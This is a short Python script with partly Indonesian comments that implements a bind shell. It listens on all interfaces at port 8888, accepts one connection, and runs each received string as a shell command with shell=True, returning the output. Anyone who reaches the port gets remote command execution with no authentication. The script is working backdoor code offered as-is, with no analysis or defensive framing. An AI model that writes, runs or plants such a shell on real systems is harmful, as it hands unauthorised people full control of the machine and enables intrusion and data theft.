import socket
import subprocess

# Inisialisasi socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 8888))
server_socket.listen(5)

print("[+] Listening for incoming connections...")

# Accept connections
client_socket, addr = server_socket.accept()
print("[+] Connection established from: %s:%d" % (addr[0], addr[1]))

while True:
    # Receive orders from clients
    command = client_socket.recv(1024).decode()

    if command.lower() == 'exit':
        # If the client wants to exit, close the connection
        client_socket.close()
        break
    else:
        try:
            # Run the command in the shell and capture the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
            client_socket.send(output)
        except Exception as e:
            # Catch errors if the command cannot be executed
            error_message = str(e).encode()
            client_socket.send(error_message)

# Close server connection
server_socket.close()
